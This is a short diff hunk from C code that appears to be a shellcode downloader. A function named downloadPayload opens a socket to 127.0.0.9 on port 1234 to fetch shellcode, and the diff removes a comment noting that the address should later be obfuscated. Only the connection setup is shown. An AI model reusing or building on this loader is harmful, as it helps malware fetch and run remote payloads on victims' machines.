@@ -197,7 +197,7 @@ BOOL downloadPayload(unsigned char* shellcode, size_t limit) {
     struct sockaddr_in clientAddress;
     clientAddress.sin_family = AF_INET;
     clientAddress.sin_port = htons(1234); 
-    clientAddress.sin_addr.s_addr = inet_addr("127.0.0.9");  // remote server to download shellcode, should be obfuscated later on
+    clientAddress.sin_addr.s_addr = inet_addr("127.0.0.9");
 
     result = connect(clientSocket, (struct sockaddr*)&clientAddress, sizeof(clientAddress));
     if (result == SOCKET_ERROR) {
